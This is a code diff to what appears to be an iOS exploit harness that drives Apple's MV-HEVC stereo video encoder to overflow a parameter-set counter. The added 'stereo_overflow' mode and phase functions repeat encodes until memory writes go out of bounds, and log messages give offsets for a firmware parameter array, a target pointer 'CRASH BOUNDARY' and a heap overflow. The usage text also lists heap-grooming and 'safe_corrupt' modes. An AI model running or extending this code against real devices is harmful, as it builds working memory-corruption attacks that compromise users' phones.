@@ -145,6 +145,17 @@ static void dump_psets(CMFormatDescriptionRef fmt, size_t baseline) {
     }
 }
 
+/* Global weak-import of iOS 17+ stereo encode API */
+extern OSStatus VTCompressionSessionEncodeMultiImageFrame(
+    VTCompressionSessionRef session,
+    CMTaggedBufferGroupRef taggedBufferGroup,
+    CMTime presentationTimeStamp,
+    CMTime duration,
+    CFDictionaryRef frameProperties,
+    void *sourceFrameRefCon,
+    VTEncodeInfoFlags *infoFlagsOut)
+    __attribute__((weak_import));
+
 static CVPixelBufferRef create_pb(int w, int h) {
     CVPixelBufferRef pb = NULL;
     CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
@@ -185,29 +196,42 @@ static VTCompressionSessionRef create_mvhevc_encoder(int w, int h, int layer_id)
     VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
 
     int base = 0;
-    CFNumberRef ids[2];
-    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base);
-    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
-    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
-    OSStatus sp1 = VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
-    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);
+    CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &base);
+    CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
+
+    /* MVHEVCVideoLayerIDs */
+    CFArrayRef layer_arr = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
+    OSStatus sp1 = VTSessionSetProperty(session, kVTCompressionPropertyKey_MVHEVCVideoLayerIDs, layer_arr);
+    CFRelease(layer_arr);
     rlog("  MVHEVCVideoLayerIDs(%d,%d): %d\n", base, layer_id, (int)sp1);
 
-    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base);
-    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
-    OSStatus sp2 = VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
-    OSStatus sp3 = VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
-    CFRelease(left); CFRelease(right);
-    rlog("  MVHEVCLeftEyeID: %d, MVHEVCRightEyeID: %d\n", (int)sp2, (int)sp3);
-    if (sp2 != 0 || sp3 != 0) {
-        rlog("  Eye IDs rejected — trying MVHEVCViewIDs instead\n");
-        CFNumberRef v0 = CFNumberCreate(NULL, kCFNumberIntType, &base);
-        CFNumberRef v1 = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
-        CFArrayRef va = CFArrayCreate(NULL, (const void *[]){v0, v1}, 2, &kCFTypeArrayCallBacks);
-        OSStatus sp4 = VTSessionSetProperty(session, CFSTR("MVHEVCViewIDs"), va);
-        rlog("  MVHEVCViewIDs: %d\n", (int)sp4);
-        CFRelease(va); CFRelease(v0); CFRelease(v1);
-    }
+    /* MVHEVCViewIDs */
+    CFArrayRef view_arr = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
+    OSStatus sp2 = VTSessionSetProperty(session, kVTCompressionPropertyKey_MVHEVCViewIDs, view_arr);
+    CFRelease(view_arr);
+    rlog("  MVHEVCViewIDs: %d\n", (int)sp2);
+
+    /* MVHEVCLeftAndRightViewIDs (REQUIRED for stereo encode) */
+    CFArrayRef lr_arr = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
+    OSStatus sp3 = VTSessionSetProperty(session, kVTCompressionPropertyKey_MVHEVCLeftAndRightViewIDs, lr_arr);
+    CFRelease(lr_arr);
+    rlog("  MVHEVCLeftAndRightViewIDs: %d\n", (int)sp3);
+
+    /* HeroEye = left */
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_HeroEye, CFSTR("left"));
+    /* HasLeftStereoEyeView + HasRightStereoEyeView */
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_HasLeftStereoEyeView, kCFBooleanTrue);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_HasRightStereoEyeView, kCFBooleanTrue);
+    /* StereoCameraBaseline */
+    uint32_t baseline = 64000;
+    CFNumberRef bl = CFNumberCreate(NULL, kCFNumberSInt32Type, &baseline);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_StereoCameraBaseline, bl);
+    CFRelease(bl);
+    /* ProfileLevel Main10 */
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel,
+        kVTProfileLevel_HEVC_Main10_AutoLevel);
+
+    CFRelease(n0); CFRelease(n1);
 
     st = VTCompressionSessionPrepareToEncodeFrames(session);
     if (st != noErr) {
@@ -241,38 +265,113 @@ static int encode_one(VTCompressionSessionRef session, int frame_idx, int w, int
     return (int)g_cb_status;
 }
 
+static CVPixelBufferRef create_yuv_pb_stereo(int w, int h, uint8_t y_fill) {
+    CVPixelBufferRef pb = NULL;
+    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
+        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
+    CVReturn ret = CVPixelBufferCreate(NULL, w, h,
+        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, attrs, &pb);
+    CFRelease(iosurf); CFRelease(attrs);
+    if (ret != kCVReturnSuccess) return NULL;
+    CVPixelBufferLockBaseAddress(pb, 0);
+    void *yp = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+    void *uvp = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+    if (yp) memset(yp, y_fill, CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * h);
+    if (uvp) memset(uvp, 128, CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * (h / 2));
+    CVPixelBufferUnlockBaseAddress(pb, 0);
+    return pb;
+}
+
+static int encode_one_stereo(VTCompressionSessionRef session, int frame_idx, int w, int h) {
+    if (!VTCompressionSessionEncodeMultiImageFrame) return -99;
+    CVPixelBufferRef pb_left = create_yuv_pb_stereo(w, h, 0x40);
+    CVPixelBufferRef pb_right = create_yuv_pb_stereo(w, h, 0x80);
+    if (!pb_left || !pb_right) {
+        if (pb_left) CVPixelBufferRelease(pb_left);
+        if (pb_right) CVPixelBufferRelease(pb_right);
+        return -1;
+    }
+    CMTag tl0 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 0);
+    CMTag left_tags[2] = { kCMTagStereoLeftEye, tl0 };
+    CMTagCollectionRef ltc = NULL;
+    CMTagCollectionCreate(NULL, left_tags, 2, &ltc);
+    CMTag tl1 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 1);
+    CMTag right_tags[2] = { kCMTagStereoRightEye, tl1 };
+    CMTagCollectionRef rtc = NULL;
+    CMTagCollectionCreate(NULL, right_tags, 2, &rtc);
+    CMTagCollectionRef tcs[2] = { ltc, rtc };
+    CVPixelBufferRef pbs[2] = { pb_left, pb_right };
+    CFArrayRef tc_arr = CFArrayCreate(NULL, (const void **)tcs, 2, &kCFTypeArrayCallBacks);
+    CFArrayRef pb_arr = CFArrayCreate(NULL, (const void **)pbs, 2, &kCFTypeArrayCallBacks);
+    CMTaggedBufferGroupRef tbg = NULL;
+    OSStatus tbg_st = CMTaggedBufferGroupCreate(NULL, tc_arr, pb_arr, &tbg);
+    CFRelease(tc_arr); CFRelease(pb_arr);
+    if (tbg_st != 0 || !tbg) {
+        CFRelease(ltc); CFRelease(rtc);
+        CVPixelBufferRelease(pb_left); CVPixelBufferRelease(pb_right);
+        return -2;
+    }
+    g_encode_done = 0;
+    g_cb_status = -999;
+    VTEncodeInfoFlags fi = 0;
+    CMTime pts = CMTimeMake(frame_idx, 30);
+    CMTime dur = CMTimeMake(1, 30);
+    OSStatus st = VTCompressionSessionEncodeMultiImageFrame(
+        session, tbg, pts, dur, NULL, NULL, &fi);
+    if (st != noErr) {
+        CFRelease(tbg); CFRelease(ltc); CFRelease(rtc);
+        CVPixelBufferRelease(pb_left); CVPixelBufferRelease(pb_right);
+        return (int)st;
+    }
+    for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
+    CFRelease(tbg); CFRelease(ltc); CFRelease(rtc);
+    CVPixelBufferRelease(pb_left); CVPixelBufferRelease(pb_right);
+    if (!g_encode_done) {
+        rlog("  WARNING: stereo callback not received after 5s\n");
+    }
+    return (int)g_cb_status;
+}
+
 /* Phase 1: Verify MV-HEVC */
 static int phase1_verify(void) {
     rlog("\n========== PHASE 1: MV-HEVC Support ==========\n");
-    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
+    if (!VTCompressionSessionEncodeMultiImageFrame) {
+        rlog("FAILED: EncodeMultiImageFrame not available (needs iOS 17+)\n");
+        return -1;
+    }
+    VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
     if (!s) {
         rlog("FAILED: MV-HEVC not supported on this device\n");
         rlog("MV-HEVC requires iPhone 15 Pro or later.\n");
         return -1;
     }
-    int st = encode_one(s, 0, 128, 128);
-    rlog("First encode: status=%d, pset_count=%zu\n", st, g_last_pset_count);
+    int st = encode_one_stereo(s, 0, 1920, 1080);
+    rlog("First stereo encode: status=%d, pset_count=%zu, bytes=%zu\n",
+         st, g_last_pset_count, g_last_pset_total_bytes);
     VTCompressionSessionInvalidate(s); CFRelease(s);
     if (st != 0) {
-        rlog("FAILED: Encode error %d\n", st);
+        rlog("FAILED: Stereo encode error %d\n", st);
         return -1;
     }
-    rlog("PASS: MV-HEVC encoder works, %zu parameter sets per frame\n", g_last_pset_count);
+    rlog("PASS: MV-HEVC stereo encoder works, %zu parameter sets per frame\n", g_last_pset_count);
     return 0;
 }
 
 /* Phase 2: Measure NAL sizes and cumsum growth */
 static int phase2_measure(void) {
     rlog("\n========== PHASE 2: NAL Size Measurement ==========\n");
-    rlog("Each MV-HEVC encode produces ~3 NAL entries (VPS+SPS+PPS)\n");
+    rlog("Each MV-HEVC stereo encode produces ~4 NAL entries (VPS+SPS+SPS+PPS)\n");
     rlog("Entry format: [NAL_type(4), layer_id(4), cumsum(4), data>>3(4)]\n");
-    rlog("OOB starts when counter > 256 entries (~86 encodes)\n\n");
+    rlog("OOB starts when counter > 256 entries (~64 encodes with pset=4)\n\n");
 
-    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
+    VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
     if (!s) return -1;
 
     for (int i = 0; i < 10; i++) {
-        int st = encode_one(s, i, 128, 128);
+        int st = encode_one_stereo(s, i, 1920, 1080);
         rlog("[%d] status=%d, psets=%zu, total_bytes=%zu\n",
              i, st, g_last_pset_count, g_last_pset_total_bytes);
         if (st != 0) break;
@@ -281,28 +380,28 @@ static int phase2_measure(void) {
     usleep(500000);
     VTCompressionSessionInvalidate(s); CFRelease(s);
 
-    rlog("\nExpected: ~3 entries/encode, cumsum grows ~0.25/entry at 128x128\n");
-    rlog("Cumsum limit: 0x801 (2049) — small frames stay well under\n");
+    rlog("\nExpected: ~4 entries/encode, cumsum grows with 1920x1080 frames\n");
+    rlog("Cumsum limit: 0x801 (2049) — check if large frames stay under\n");
     return 0;
 }
 
 /* Phase 3: Counter overflow */
 static int phase3_overflow(int max_encodes) {
     rlog("\n========== PHASE 3: Counter Overflow (%d encodes) ==========\n", max_encodes);
-    rlog("OOB entry thresholds (table 1):\n");
-    rlog("  256 (~86 enc): First write past VPS sub-object boundary\n");
-    rlog("  588 (~196 enc): Firmware param array +0x5C34\n");
-    rlog("  592 (~197 enc): +0x5C70 target pointer — CRASH BOUNDARY\n");
+    rlog("OOB entry thresholds (table 1, pset=4/enc):\n");
+    rlog("  256 (~64 enc): First write past VPS sub-object boundary\n");
+    rlog("  588 (~147 enc): Firmware param array +0x5C34\n");
+    rlog("  592 (~148 enc): +0x5C70 target pointer — CRASH BOUNDARY\n");
     rlog("OOB entry thresholds (table 2 — PRIMARY PATH):\n");
-    rlog("  466 (~155 enc): Past buffer end → HEAP OVERFLOW\n\n");
+    rlog("  466 (~117 enc): Past buffer end → HEAP OVERFLOW\n\n");
 
-    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
+    VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
     if (!s) return -1;
 
     int first_error = -1;
     int errors = 0;
     for (int i = 0; i < max_encodes; i++) {
-        int st = encode_one(s, i, 128, 128);
+        int st = encode_one_stereo(s, i, 1920, 1080);
         if (st != 0) {
             if (first_error < 0) first_error = i;
             errors++;
@@ -2165,6 +2264,51 @@ cleanup_dummies:
             }
         }
 
+    } else if (strcmp(mode, "stereo_overflow") == 0) {
+        int num_enc = 100;
+        if (argc > 2) num_enc = atoi(argv[2]);
+        if (num_enc < 1) num_enc = 100;
+        rlog("STEREO_OVERFLOW: %d MV-HEVC stereo encodes (counter overflow test)\n", num_enc);
+        rlog("With pset=4 per encode, overflow at entry 256 = ~64 encodes\n");
+        rlog("At entry 256, writes cross VPS table sub-object boundary\n\n");
+
+        if (!VTCompressionSessionEncodeMultiImageFrame) {
+            rlog("FAILED: EncodeMultiImageFrame not available\n"); goto done;
+        }
+
+        VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
+        if (!s) { rlog("FAILED: create_mvhevc_encoder\n"); goto done; }
+
+        g_cb_count = 0;
+        int errors = 0;
+        for (int i = 0; i < num_enc; i++) {
+            int st = encode_one_stereo(s, i, 1920, 1080);
+            if (st != 0) {
+                rlog("[%d] ERROR: %d\n", i, st);
+                errors++;
+                if (errors > 3) { rlog("Too many errors, stopping\n"); break; }
+            } else {
+                int total_entries = g_cb_count * (int)g_last_pset_count;
+                if (i < 5 || i % 10 == 0 || i >= 60 || total_entries >= 240) {
+                    rlog("[%d] ok, pset=%zu, bytes=%zu, cb=%d, est_entries=%d%s\n",
+                         i, g_last_pset_count, g_last_pset_total_bytes, g_cb_count,
+                         total_entries,
+                         total_entries >= 256 ? " *** OOB ***" : "");
+                }
+            }
+        }
+        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+        int final_entries = g_cb_count * (int)g_last_pset_count;
+        rlog("\nDone: %d encodes, %d errors, cb=%d, est_entries=%d\n",
+             num_enc, errors, g_cb_count, final_entries);
+        if (final_entries >= 256) {
+            rlog("*** COUNTER OVERFLOW ACHIEVED: %d entries > 256 ***\n", final_entries);
+            rlog("VPS table sub-object boundary crossed!\n");
+        } else {
+            rlog("Counter did NOT overflow (need 256+ entries, got %d)\n", final_entries);
+        }
+        VTCompressionSessionInvalidate(s); CFRelease(s);
+
     } else if (strcmp(mode, "diag5") == 0) {
         rlog("DIAG5: MV-HEVC with ALL required stereo properties\n");
         rlog("Uses official SDK constants + MVHEVCLeftAndRightViewIDs + HeroEye\n\n");
@@ -2372,6 +2516,7 @@ cleanup_dummies:
         rlog("  session_reuse [lid] [rounds] -- Test kalloc_data stale counter reuse\n");
         rlog("  safe_corrupt [lid] [enc]     -- Safe-window +0x5C34 corruption (max 197 enc)\n");
         rlog("  session_reuse_groom [lid] [dummies] -- Stale counter with heap grooming\n");
+        rlog("  stereo_overflow [enc] -- MV-HEVC stereo counter overflow test (default 100)\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
